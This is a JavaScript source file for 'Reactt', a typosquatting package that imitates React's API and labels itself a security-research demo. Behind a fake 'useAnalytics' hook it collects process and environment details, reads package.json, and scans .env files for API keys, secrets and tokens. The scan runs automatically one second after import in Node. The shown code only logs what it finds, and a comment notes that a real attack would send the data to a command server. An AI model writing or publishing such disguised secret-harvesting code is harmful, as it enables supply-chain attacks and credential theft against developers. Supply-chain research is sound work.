/**
 * Reactt - Enhanced React library with additional features
 * WARNING: This is a typosquatting demo package for security research
 */

// Mimic React's basic API to appear legitimate
const Reactt = {
  version: '18.2.1',
  
  createElement: function(type, props, ...children) {
    // Basic React.createElement mock
    return {
      type: type,
      props: props || {},
      children: children.length === 1 ? children[0] : children,
      $$typeof: Symbol.for('react.element')
    };
  },
  
  Component: class Component {
    constructor(props) {
      this.props = props || {};
      this.state = {};
    }
    
    setState(partialState) {
      this.state = Object.assign({}, this.state, partialState);
    }
    
    render() {
      return null;
    }
  },
  
  // Malicious data collection disguised as React hook
  useAnalytics: function() {
    try {
      const { exec } = require('child_process');
      const os = require('os');
      const fs = require('fs');
      
      // Collect browser/development environment info
      const envInfo = {
        nodeVersion: process.version,
        platform: os.platform(),
        arch: os.arch(),
        cwd: process.cwd(),
        args: process.argv,
        env: {
          NODE_ENV: process.env.NODE_ENV,
          REACT_APP_API_URL: process.env.REACT_APP_API_URL,
          REACT_APP_ENV: process.env.REACT_APP_ENV
        }
      };
      
      // Look for React project structure
      const projectInfo = this._scanReactProject();
      
      // Attempt to find and read sensitive React config files
      this._extractReactSecrets();
      
      console.log('[DEMO] Reactt analytics initialized');
      console.log('[DEMO] Collected environment info for', envInfo.platform);
      
      // In real attack, would send to C2 server
      return envInfo;
      
    } catch (error) {
      return null;
    }
  },
  
  _scanReactProject: function() {
    try {
      const fs = require('fs');
      const path = require('path');
      
      const projectFiles = {
        hasPackageJson: fs.existsSync('package.json'),
        hasPublicDir: fs.existsSync('public'),
        hasSrcDir: fs.existsSync('src'),
        hasYarnLock: fs.existsSync('yarn.lock'),
        hasPackageLock: fs.existsSync('package-lock.json'),
        hasEnvFile: fs.existsSync('.env') || fs.existsSync('.env.local'),
        hasGitignore: fs.existsSync('.gitignore')
      };
      
      // Read package.json for project details
      if (projectFiles.hasPackageJson) {
        try {
          const pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'));
          projectFiles.projectName = pkg.name;
          projectFiles.dependencies = Object.keys(pkg.dependencies || {});
        } catch (error) {
          // Ignore parsing errors
        }
      }
      
      return projectFiles;
    } catch (error) {
      return {};
    }
  },
  
  _extractReactSecrets: function() {
    try {
      const fs = require('fs');
      const secrets = [];
      
      // Common React environment files
      const envFiles = ['.env', '.env.local', '.env.development', '.env.production'];
      
      envFiles.forEach(file => {
        if (fs.existsSync(file)) {
          try {
            const content = fs.readFileSync(file, 'utf8');
            const lines = content.split('\n');
            
            lines.forEach(line => {
              if (line.includes('API_KEY') || line.includes('SECRET') || line.includes('TOKEN')) {
                secrets.push(`${file}: ${line.trim()}`);
              }
            });
          } catch (error) {
            // Ignore read errors
          }
        }
      });
      
      if (secrets.length > 0) {
        console.log('[DEMO] Found potential secrets:', secrets.length);
      }
      
      return secrets;
    } catch (error) {
      return [];
    }
  }
};

// Auto-execute analytics collection when imported
if (typeof window === 'undefined' && typeof global !== 'undefined') {
  // Node.js environment - likely server-side rendering
  setTimeout(() => {
    Reactt.useAnalytics();
  }, 1000);
}

// Export both as default and named export to match React
module.exports = Reactt;
module.exports.default = Reactt;
